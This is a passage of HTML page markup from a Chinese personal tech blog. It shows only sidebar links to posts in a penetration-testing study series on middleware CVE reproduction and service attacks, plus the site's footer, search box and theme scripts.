href="/2023/03/12/Day60-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Weblogic-Jenkins-GlassFish/" title="Day60 服务攻防-中间件安全&amp;CVE复现&amp;Weblogic&amp;Jenkins&amp;GlassFish"><img src="https://pic3.zhimg.com/80/v2-cf47c69eb36f1e52c07ce880aa35685a_1440w.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Day60 服务攻防-中间件安全&amp;CVE复现&amp;Weblogic&amp;Jenkins&amp;GlassFish"/></a><div class="content"><a class="title" href="/2023/03/12/Day60-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Weblogic-Jenkins-GlassFish/" title="Day60 服务攻防-中间件安全&amp;CVE复现&amp;Weblogic&amp;Jenkins&amp;GlassFish">Day60 服务攻防-中间件安全&amp;CVE复现&amp;Weblogic&amp;Jenkins&amp;GlassFish</a><time datetime="2023-03-12T03:08:13.000Z" title="发表于 2023-03-12 11:08:13">2023-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/12/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/" title="Day59 服务攻防-中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx"><img src="https://pic3.zhimg.com/80/v2-81c20a386af2d4c1de7d221a6338d62a_1440w.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Day59 服务攻防-中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx"/></a><div class="content"><a class="title" href="/2023/03/12/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/" title="Day59 服务攻防-中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx">Day59 服务攻防-中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx</a><time datetime="2023-03-12T03:07:48.000Z" title="发表于 2023-03-12 11:07:48">2023-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/11/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/" title="Day58 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV"><img src="https://pic1.zhimg.com/80/v2-6ff5732c9bdd51365e27d45c1069ee9c_1440w.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Day58 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV"/></a><div class="content"><a class="title" href="/2023/03/11/Day58-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-%E8%AE%BE%E5%A4%87Kibana-Zabbix-%E8%BF%9C%E6%8E%A7%E5%90%91%E6%97%A5%E8%91%B5-VNC-TV/" title="Day58 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV">Day58 服务攻防-应用协议&amp;设备Kibana&amp;Zabbix&amp;远控向日葵&amp;VNC&amp;TV</a><time datetime="2023-03-11T02:22:27.000Z" title="发表于 2023-03-11 10:22:27">2023-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/11/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/" title="Day57 服务攻防-应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解"><img src="https://pic4.zhimg.com/80/v2-e46bd15ab28ea1a5ad5d501abde16873_1440w.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Day57 服务攻防-应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解"/></a><div class="content"><a class="title" href="/2023/03/11/Day57-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE-Rsync-SSH-RDP-FTP-%E6%BC%8F%E6%B4%9E%E6%89%B9%E6%89%AB-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3/" title="Day57 服务攻防-应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解">Day57 服务攻防-应用协议&amp;Rsync&amp;SSH&amp;RDP&amp;FTP&amp;漏洞批扫&amp;口令猜解</a><time datetime="2023-03-11T02:22:08.000Z" title="发表于 2023-03-11 10:22:08">2023-03-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By pwy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
